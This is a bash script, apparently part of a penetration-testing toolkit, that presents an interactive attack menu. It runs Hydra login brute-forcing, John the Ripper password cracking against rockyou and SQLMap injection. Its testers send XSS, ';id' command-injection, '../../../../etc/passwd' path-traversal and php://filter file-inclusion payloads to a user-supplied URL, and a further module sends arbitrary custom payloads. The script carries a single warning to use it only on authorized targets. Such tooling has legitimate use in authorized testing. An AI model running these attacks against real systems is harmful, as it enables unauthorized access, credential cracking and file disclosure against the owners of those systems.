#!/bin/bash

# Attack Modules Menu

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

attack_loop() {
    while true; do
        clear
        echo -e "${CYAN}=== Attack Modules ===${NC}"
        echo
        echo -e "${RED}[!] WARNING: Only use on authorized targets!${NC}"
        echo
        echo -e "${CYAN}[1]${NC} Hydra - Brute Force Login"
        echo -e "${CYAN}[2]${NC} John the Ripper - Password Cracking"
        echo -e "${CYAN}[3]${NC} SQLMap - SQL Injection"
        echo -e "${CYAN}[4]${NC} XSS Payload Tester"
        echo -e "${CYAN}[5]${NC} Command Injection Tester"
        echo -e "${CYAN}[6]${NC} Path Traversal Tester"
        echo -e "${CYAN}[7]${NC} CSRF Tester"
        echo -e "${CYAN}[8]${NC} Custom Payload Sender"
        echo -e "${CYAN}[9]${NC} LFI/RFI Scanner"
        echo -e "${CYAN}[0]${NC} Back to Main Menu"
        echo
        read -p "Select option: " opt

        case $opt in
            1) hydra_brute ;;
            2) john_crack ;;
            3) sqlmap_attack ;;
            4) xss_attack ;;
            5) cmdi_attack ;;
            6) path_traversal ;;
            7) csrf_test ;;
            8) custom_payload ;;
            9) lfi_rfi_scan ;;
            0) break ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        read -p "Press Enter to continue..."
    done
}

hydra_brute() {
    log "Hydra Brute Force"
    read -p "Service (ssh/ftp/http-post-form): " service
    read -p "Username list: " userlist
    read -p "Password list: " passlist
    read -p "Target IP/host: " target
    case $service in
        http-post-form)
            read -p "Post data (e.g., /login.php:user=^USER^&pass=^PASS^:F=incorrect): " postdata
            hydra -L "$userlist" -P "$passlist" "$target" "$service" "$postdata" -o "$RESULTS_DIR/attacks/hydra.txt"
            ;;
        *) hydra -L "$userlist" -P "$passlist" "$target" "$service" -o "$RESULTS_DIR/attacks/hydra.txt" ;;
    esac
    success "Hydra results saved"
}

john_crack() {
    log "John the Ripper"
    read -p "Hash file path: " hashfile
    read -p "Wordlist (default: rockyou): " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
    john --wordlist="$wordlist" "$hashfile" --output="$RESULTS_DIR/attacks/john.txt"
    success "John results saved"
}

sqlmap_attack() {
    log "SQLMap Attack"
    read -p "Target URL: " url
    read -p "Risk (1-3): " risk
    read -p "Level (1-5): " level
    sqlmap -u "$url" --risk=$risk --level=$level --batch --output-dir="$RESULTS_DIR/attacks/sqlmap"
    success "SQLMap results saved"
}

xss_attack() {
    log "XSS Payload Tester"
    read -p "Parameter to test: " param
    read -p "Target URL with placeholder: " url
    payload='<script>alert(1)</script>'
    test_url="${url/$param/$payload}"
    echo "Testing: $test_url"
    curl -s "$test_url" | grep -o '<script>alert(1)</script>' && echo -e "${GREEN}[+] XSS Reflected!${NC}" || echo -e "${YELLOW}[-] Not reflected${NC}"
}

cmdi_attack() {
    log "Command Injection Tester"
    read -p "Parameter: " param
    read -p "Base URL: " url
    payload=';id'
    test_url="${url/$param/$payload}"
    echo "Testing: $test_url"
    response=$(curl -s "$test_url")
    echo "$response" | grep -o 'uid=[0-9]*' && echo -e "${GREEN}[+] Command Injection possible!${NC}" || echo -e "${YELLOW}[-] Not vulnerable${NC}"
}

path_traversal() {
    log "Path Traversal Tester"
    read -p "Parameter: " param
    read -p "Base URL: " url
    payload='../../../../etc/passwd'
    test_url="${url/$param/$payload}"
    echo "Testing: $test_url"
    curl -s "$test_url" | grep -o 'root:x' && echo -e "${GREEN}[+] Path Traversal found!${NC}" || echo -e "${YELLOW}[-] Not vulnerable${NC}"
}

csrf_test() {
    log "CSRF Tester"
    echo -e "${YELLOW}[!] Check for missing CSRF tokens in forms${NC}"
    curl -s "$TARGET_URL" | grep -i "csrf\|token\|_token" || echo "No CSRF tokens found - vulnerable?"
}

custom_payload() {
    log "Custom Payload Sender"
    read -p "Payload: " payload
    read -p "Method (GET/POST): " method
    read -p "URL: " url
    if [ "$method" = "POST" ]; then
        curl -s -X POST -d "$payload" "$url"
    else
        curl -s "$url?$payload"
    fi
}

lfi_rfi_scan() {
    log "LFI/RFI Scanner"
    read -p "Parameter: " param
    read -p "Base URL: " url
    payload='php://filter/convert.base64-encode/resource=index'
    test_url="${url/$param/$payload}"
    echo "Testing LFI: $test_url"
    response=$(curl -s "$test_url")
    echo "$response" | base64 -d 2>/dev/null && echo -e "${GREEN}[+] LFI possible!${NC}" || echo -e "${YELLOW}[-] Check manually${NC}"
}

attack_loop
